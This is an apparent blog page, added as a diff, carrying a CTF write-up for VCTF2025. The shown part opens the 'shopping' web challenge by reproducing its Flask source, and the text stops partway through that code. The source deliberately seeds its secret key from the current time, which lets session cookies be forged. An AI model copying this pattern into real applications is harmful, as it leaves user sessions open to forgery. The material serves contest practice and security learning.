@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/11/18/vctf2025-wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="WEBshopping侥幸拿了个三血(被那个验证码的题卡到了，早知道早点做这题了，可能还能拿一血) 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VCTF2025 WP">
+<meta property="og:url" content="http://laijunyue.github.io/2025/11/18/VCTF2025-WP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBshopping侥幸拿了个三血(被那个验证码的题卡到了，早知道早点做这题了，可能还能拿一血) 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115214005685.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115104521248.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115104539134.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115112908322.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115115409942.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115115446606.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115115436083.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115115549349.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115144825202.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115144853820.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115145305242.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115122424081.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115122510393.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115122535670.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115122548315.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115151146550.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115124019582.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115124036273.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115124049667.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115124104218.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115124119497.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115175959513.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251115124159829.png">
+<meta property="article:published_time" content="2025-11-18T11:07:05.000Z">
+<meta property="article:modified_time" content="2025-11-18T01:18:52.412Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laijunyue.github.io/images/image-20251115214005685.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/background.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/background.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/background.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            VCTF2025 WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">VCTF2025 WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-18 19:07:05</span>
+        <span class="mobile">2025-11-18 19:07:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-18 09:18:52</span>
+            <span class="mobile">2025-11-18 09:18:52</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251115214005685.png"
+                      alt="image-20251115214005685"
+                ></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="shopping"><a href="#shopping" class="headerlink" title="shopping"></a>shopping</h2><p>侥幸拿了个三血(被那个验证码的题卡到了，早知道早点做这题了，可能还能拿一血)</p>
+<p>源码</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session, render_template, render_template_string, redirect, url_for, make_response</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(time.time()))</span><br><span class="line">secret_key = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, k=<span class="number">32</span>))</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = secret_key</span><br><span class="line"></span><br><span class="line">app.flag_content = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 数据模型 ====================</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line">        self.is_admin = <span class="literal">False</span></span><br><span class="line">        self.balance = <span class="number">1000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_password</span>(<span class="params">self, 